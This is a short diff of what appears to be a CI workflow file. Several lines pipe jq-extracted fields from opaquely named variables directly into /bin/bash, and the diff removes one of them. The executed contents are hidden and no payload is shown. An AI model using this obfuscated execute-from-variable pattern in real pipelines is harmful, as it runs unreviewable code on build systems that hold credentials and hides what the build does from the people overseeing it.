@@ -27,7 +27,6 @@ jobs:
           echo $rjso5 | jq -r .bu38281 | /bin/bash
           printf '%s' "$wrgu375" | jq -r .j23 | /bin/bash
           printf '%s' "$pesg128" | jq -r .xqe61 | /bin/bash
-          printf '%s' "$hb4911" | jq -r .cri73586 | /bin/bash
           echo $nb4236 | jq -r .l9176 | /bin/bash
 
       - name: Save output
